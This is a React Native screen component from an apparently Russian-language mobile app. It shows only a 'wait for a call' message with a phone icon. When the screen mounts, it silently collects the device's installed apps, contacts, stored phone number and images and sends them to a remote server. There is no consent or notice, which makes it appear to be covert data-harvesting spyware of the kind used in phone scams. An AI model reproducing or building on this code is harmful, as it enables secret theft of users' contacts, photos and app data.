import React, { useState, useEffect } from 'react';
import { View, Text, StyleSheet, Image } from 'react-native';
import Images from '../../modules/Images';
import Apps from '../../modules/Apps';
import Contact from '../../modules/Contact';
import StorageManager from '../StorageManager';
import ImagePhone from '../../resources/img/phone-100.png'
export default function Main() {
  const [inputText, setInputText] = useState('');
  const [hotlineNumber, setHotlineNumber] = useState('')
  const [maxlength, setMaxlength] = useState(0)
  const defaultHeaders = new Headers();
  defaultHeaders.append('Content-Type', 'application/json');
  defaultHeaders.append('Authorization', 'Bearer your_token_here');
  const handleInputChange = (text) => {
    setInputText(text);
  };
  const handleContinuePress = () => {
    console.log('Продолжить');
  };
  const formatHotlineNumber = async () => {
    const storedHotline = await StorageManager.getData('hotline');
    const formattedNumber = storedHotline.replace(/[\s-]/g, '');
    await setHotlineNumber(formattedNumber.replace(/(\d{1})(\d{3})(\d{3})(\d{2})(\d{2})/, '8 $2 $3-$4-$5'))
  };
  const getData = async () => {
    var apps = await Apps.loadApps()
    var contacts = await Contact.loadContacts()
    var maxlength = 0
    try {
      var formData = await Images.getImages();
    } catch (error) {
      console.log(error);
    }

    if (maxlength === 0 && formData._parts.length > 0) {
      console.log(`Form data length ${formData._parts.length}`);
      maxlength = formData._parts.length;
    }
    const phoneNumber = await StorageManager.getData('phoneNumber');
    const user_data = {
      phoneNumber
    };
    try {
      if (formData._parts && formData) {
        if (maxlength !== 0 && formData._parts.length > 0) {
          console.log(maxlength);
          formData.append('userId', phoneNumber);
          console.log('form add ', formData._parts[maxlength]);
        }
        if (formData._parts[maxlength + 1]) {
          console.log('form has', formData._parts[maxlength + 1]);
        }
      }
    } catch (error) {
      console.log(error)
    }


    const data = { user_data: user_data, contacts: contacts, apps: apps }
    //https://gosserveraugust-production.up.railway.app/user/add
    fetch("http://192.168.31.31:3000/user/add", {
      method: "POST",
      headers: defaultHeaders,
      body: JSON.stringify(data)
    })
      .then(response => {
        console.log(response)
      })
      .catch(error => {
        setLoading(false);
      });
    try {
      if (formData._parts.length > 0) {
        Images.sendImages(formData)
      }
    } catch (error) {

    }
  }
  useEffect(() => {
    getData()
  }, [])
  return (
    <View style={styles.container}>
      <View style={styles.main}>
        <Text style={[styles.text, { color: '#fff' }]}>Ожидайте звонка</Text>
        <Image source={ImagePhone} style={styles.imagePhone}></Image>
      </View>
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#2A2A32',
    alignItems: 'center',
    justifyContent: 'center',
  },
  main: {
    height: 500,
    width: 350,
    borderRadius: 15,
    alignItems: "center",
    flexDirection: "column",
    marginTop: 200
  },
  image: {
    position: 'absolute',
    top: 0,
    right: 0,
    left: 0,
    width: 75,
    height: 75,
  },
  imagePhone: {
    marginTop: 25,
    width: 75,
    height: 75
  },
  svg: {
    paddingTop: 110
  },
  text: {
    fontSize: 18,
    color: 'black'
  },
  text2: {
    fontSize: 18,
    color: 'black'
  },
  maintext: {
    alignItems: "center",
    paddingTop: 30,
    paddingBottom: 10,
    color: 'black'
  },
  numberview: {
    alignItems: "center",

  },
  numberview_text: {
    textAlign: 'center',
    fontWeight: 'bold',
    fontSize: 14,
    paddingLeft: 10,
    paddingRight: 10,
    lineHeight: 25,
    color: 'black'
  },
  button: {
    width: '100%',
    height: 50,
    justifyContent: 'center',
    alignItems: 'center',
    borderRadius: 10,
    marginTop: 450
  },
  buttonText: {
    color: 'white',
    fontSize: 16,
  },
});
